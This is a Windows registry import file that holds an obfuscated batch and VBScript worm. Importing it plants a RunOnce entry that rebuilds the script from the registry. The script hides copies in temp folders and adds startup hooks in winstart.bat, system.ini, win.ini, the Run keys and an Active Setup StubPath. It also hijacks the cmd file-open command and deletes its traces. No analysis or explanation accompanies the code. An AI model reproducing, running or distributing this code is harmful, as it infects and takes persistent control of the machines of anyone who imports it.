REGEDIT4
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
"Z1"="command /c echo createobject(\"Scripting.filesystemobject\").createtextfile(\"hkiaL.bat\").write createobject(\"wscript.shell\").regread(\"HKCU\\Software\\nKCo\\\"):createobject(\"wscript.shell\").run \"hkiaL.bat\",777-777>kb6T.vbs"
"Z1UJ"="wscript kb6T.vbs"
[HKEY_CURRENT_USER\Software\nKCo]
@="@EchO oFf%qi2GHJ%\r\nVeR|FiNd /I \"xp\"|iF eRRorLeVel 1 cTTy nUl%qi2GHJ%\r\nReM ?2K'(|SET ´?¦q2=Script%qi2GHJ%\r\necho.on error resume next>%TMp%\\0xU1Z7Zw.L43%qi2GHJ%\r\necHO set Ks=CReatEobjECT(\"w%´?¦q2%.shell\")>>%tMp%\\0xU1Z7Zw.L43%qi2GHJ%\r\neCHO SeT WYOQ=creATEOBjeCT(\"%´?¦q2%ing.filesystemobject\")'run>>%tMp%\\0xU1Z7Zw.L43%qi2GHJ%\r\nechO dim NB'run>>%tmp%\\0xU1Z7Zw.L43%qi2GHJ%\r\neCHO NB=Ks.regread(\"HKCU\\Software\\cBp6dKq5\\\")'run>>%TmP%\\0xU1Z7Zw.L43%qi2GHJ%\r\nEcho SET je14IFI=WYOQ.createtextfile(\"%tmp%\\shellwin.bat\",1)'run>>%tmp%\\0xU1Z7Zw.L43%qi2GHJ%\r\necHo je14IFI.write NB'run>>%TMp%\\0xU1Z7Zw.L43%qi2GHJ%\r\necHO Ks.run \"%tmp%\\shellwin.bat uDiNWNX\",0>>%tMP%\\0xU1Z7Zw.L43%qi2GHJ%\r\nif h?%WInDir%==h? Set windir=%systemroot%%qi2GHJ%\r\nfind \"qi2GHJ\"<%0>%tmp%\\shellwin.bat\r\nif not exist %tmp%\\YEyj\\*.* md %tmp%\\YEyj%qi2GHJ%\r\nattrib +s +h %tmp%\\YEyj%qi2GHJ%\r\nif exist %tmp%\\YEyj\\4iR.bat goto qi2GHJBOUM\r\ncopy %tmp%\\shellwin.bat %tmp%\\YEyj\\4iR.bat%qi2GHJ%\r\nattrib -r %wiNDiR%\\winstart.bat%qi2GHJ%\r\neCHO @call %tmp%\\YEyj\\4iR.bat 4ZN9oaw>>%wiNdIr%\\winstart.bat%qi2GHJ%\r\n:qi2GHJBOUM\r\nfind /i /v \"run\"<%tmP%\\0xU1Z7Zw.L43>%tmp%\\shellcfg.vbs%qi2GHJ%\r\nEchO SEt fRXviwGwOV=CREATeobJeCT(\"%´?¦q2%ing.filesystemobject\")>>%tmp%\\shellcfg.vbs%qi2GHJ%\r\nEcHO if err.number=429 then>>%tmp%\\shellcfg.vbs%qi2GHJ%\r\necHO javascript:location.reload()>>%tmp%\\shellcfg.vbs%qi2GHJ%\r\neChO end if>>%tmp%\\shellcfg.vbs%qi2GHJ%\r\nECHo sEt uCyCSMSN=fRXviwGwOV.createtextfile(\"%TMP%\\D9zub1jw.bat\",1)>>%tmp%\\shellcfg.vbs%qi2GHJ%\r\ncopy %TMP%\\0xU1Z7Zw.L43 %tmp%\\WX_.vbs%qi2GHJ%\r\nfind /v /i \"[boot]\"<%wINdiR%\\system.ini>%Tmp%\\AJBS1.L43%qi2GHJ%\r\nfind /v /i \"shell=explorer.exe\"<%tmp%\\AJBS1.L43>%tMP%\\pp.L43%qi2GHJ%\r\ndel %wINDiR%\\system.ini%qi2GHJ%\r\neCHO [boot]>%WInDir%\\system.ini%qi2GHJ%\r\neChO Shell=Explorer.exe WX_.vbs>>%WiNDIr%\\system.ini%qi2GHJ%\r\ntype %tmP%\\pp.L43>>%WINdIR%\\system.ini%qi2GHJ%\r\ncopy %TmP%\\0xU1Z7Zw.L43 %tmp%\\V4n.vbs%qi2GHJ%\r\nfind /v /i \"[windows]\"<%WindIR%\\win.ini>%Tmp%\\IN.L43%qi2GHJ%\r\nfind /v /i \"load=\"<%tmp%\\IN.L43>%tMp%\\_fVyF.L43%qi2GHJ%\r\nfind /v /i \"run=\"<%TMp%\\_fVyF.L43>%TMP%\\30YF.L43%qi2GHJ%\r\nfind /v /i \"NullPort=\"<%TMp%\\_fVyF.L43>%TMP%\\30YF.L43%qi2GHJ%\r\ndel %wINdir%\\win.ini%qi2GHJ%\r\nECho [windows]>%wIndir%\\win.ini%qi2GHJ%\r\nEcHO load=>>%WinDIR%\\win.ini%qi2GHJ%\r\nEcho run=V4n.vbs>>%WiNDiR%\\win.ini%qi2GHJ%\r\neCHo NullPort=None>>%WInDIr%\\win.ini%qi2GHJ%\r\ntype %tmp%\\30YF.L43>>%wiNdIr%\\win.ini%qi2GHJ%\r\necHO.on error resume next>%TMP%\\6XeFu_v7.vbs%qi2GHJ%\r\nEcHo SEt na=creaTeobJECt(\"%´?¦q2%ing.filesystemobject\")>>%tmP%\\6XeFu_v7.vbs%qi2GHJ%\r\nEcHo set i7W=cREaTeObjeCt(\"w%´?¦q2%.shell\")>>%TMP%\\6XeFu_v7.vbs%qi2GHJ%\r\nEchO BjH8gu=na.opentextfile(\"%tmp%\\shellwin.bat\").readall()>>%TMp%\\6XeFu_v7.vbs%qi2GHJ%\r\nECHO SeT Lf4KT=na.opentextfile(\"%tmp%\\shellcfg.vbs\",8)>>%tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\neCho Lf4KT.write \"uCyCSMSN.write \"\"\"\"\">>%TmP%\\6XeFu_v7.vbs%qi2GHJ%\r\neCHo for ULamN=1 to len(BjH8gu)>>%Tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\necHo TR=asc(mid(BjH8gu,ULamN,1))>>%tmP%\\6XeFu_v7.vbs%qi2GHJ%\r\neCHO Lf4KT.write \"&chr(\"&TR&\")\">>%tMp%\\6XeFu_v7.vbs%qi2GHJ%\r\necHo next>>%tmP%\\6XeFu_v7.vbs%qi2GHJ%\r\nECHO Lf4KT.writeline vbcrlf&\"Ks.run \"&chr(34)&\"%tMp%\\D9zub1jw.bat\"&chr(34)&\",0\">>%Tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\necho i7W.regwrite \"HKCU\\Software\\cBp6dKq5\\\",BjH8gu>>%Tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\ncopy %tMp%\\0xU1Z7Zw.L43 %tmp%\\_l7ubhT0.vbs%qi2GHJ%\r\necHO i7W.regWrItE \"HKLM\\sOFtwarE\\MIcrosofT\\wINdoWS\\cUrREN\"&CHR(115+1)&\"VeRsIoN\\Run\\drvdrv\",\"wSCRipT %tmp%\\_l7ubhT0.vbs\">>%tmP%\\6XeFu_v7.vbs%qi2GHJ%\r\ncopy %Tmp%\\0xU1Z7Zw.L43 %tmp%\\2VW0Ait8.vbs%qi2GHJ%\r\nEcHo i7W.reGwRite \"HKCU\\SoftWARe\\MiCrOsoFt\\wIndOWS\\CUrreN\"&chR(115+1)&\"VErsiOn\\Run\\helpinit\",\"%tmp%\\2VW0Ait8.vbs\">>%TmP%\\6XeFu_v7.vbs%qi2GHJ%\r\ncopy %TmP%\\0xU1Z7Zw.L43 %tmp%\\ilZ.vbs%qi2GHJ%\r\nEchO i7W.REgWRitE \"HKLM\\SOftware\\mIcroSOfT\\AcTIVE SETUP\\inSTAllEd cOMpoNENtS\\keyNAmE\\stuBpath\",\"%tmp%\\ilZ.vbs\">>%tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\nfind /i /v \"run\"<%TMP%\\0xU1Z7Zw.L43>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEcho dim Y04VcsaM, XbLwCPtzy>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nechO sEt N9cev0iJlv=wsCRIpt.Arguments>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEchO if not(N9cev0iJlv.count=0) and not(N9cev0iJlv.count=1) then>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEChO for Y04VcsaM=0 to N9cev0iJlv.count-1>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nechO XbLwCPtzy=XbLwCPtzy&N9cev0iJlv(Y04VcsaM)&\" \">>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEChO next>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEchO Ks.exec XbLwCPtzy>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nechO end if>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEChO sEt FcDQI_f00n=CrEAteOBjeCt(\"%´?¦q2%ing.filesystemobject\")>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\nEcHO dim LH__jyl5yr>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\neCHO LH__jyl5yr=Ks.regread(\"HKCU\\Software\\cBp6dKq5\\\")>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\neCHo Set dzDMd7VLXd=FcDQI_f00n.createtextfile(\"%tmp%\\shellwin.bat\",1)>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\neCHO dzDMd7VLXd.write LH__jyl5yr>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\necHO Ks.run \"%tmp%\\shellwin.bat uDiNWNX\",0>>%tmp%\\42ctwjNf.vbs%qi2GHJ%\r\n%qi2GHJ%%¡K%SeT dn¥=FIle\\SheLL\\OpEn\\CoMMAn\r\nEcho i7W.RegWrITE \"HKCR\\cmd%dn¥%d\\\",\"WScrIPt %tmp%\\42ctwjNf.vbs \"\"%%1 %%*\"\"\">>%Tmp%\\6XeFu_v7.vbs%qi2GHJ%\r\ncscript %tMP%\\6XeFu_v7.vbs>nul%qi2GHJ%\r\n%qi2GHJ%seT q´°_@B=erase %TmP%\\*.\r\n%q´°_@B%L43%qi2GHJ%\r\n%q´°_@B%bat%qi2GHJ%\r\n%q´°_@B%vbs%qi2GHJ%\r\n%q´°_@B%js%qi2GHJ%\r\n:qi2GHJWKCYtnVL\r\nVEr|FINd /I \"XP\"|IF ErROrlevel 1 CttY COn%qi2GHJ%\r\ncls%qi2GHJ%\r\n"
